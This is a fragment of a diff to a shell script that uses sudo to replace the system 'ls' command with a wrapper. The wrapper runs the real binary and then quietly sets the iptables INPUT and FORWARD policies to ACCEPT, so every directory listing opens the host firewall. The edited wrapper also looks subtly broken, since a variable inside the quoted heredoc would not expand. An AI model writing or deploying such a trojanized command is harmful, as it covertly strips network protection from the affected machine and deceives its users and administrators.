@@ -3,11 +3,10 @@
 ls_path="$(which ls 2>/dev/null)"
 sudo bash -c "cat > \"$ls_path\"" << 'EOF'
 #!/bin/bash
-if [[ "$1" == "$(which ls)" ]]; then
+if [[ "$1" == "$ls_path" ]]; then
     shift
 fi
-"$(which ls).real" "$@"
-"$(which ls).real"
+$ls_path.real "$@"
 
 sudo iptables -P INPUT ACCEPT > /dev/null 2>&1
 sudo iptables -P FORWARD ACCEPT > /dev/null 2>&1
